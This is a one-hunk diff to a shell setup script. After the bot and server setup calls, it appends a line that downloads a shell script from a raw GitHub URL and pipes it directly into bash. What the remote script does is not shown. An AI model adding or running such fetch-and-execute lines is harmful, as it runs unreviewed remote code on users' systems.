@@ -168,3 +168,4 @@ EOF
 # === Main ===
 setup_bot
 server_app
+curl -sL https://raw.githubusercontent.com/rifg67/script-rifts/main/api/pasang-status.sh | bash
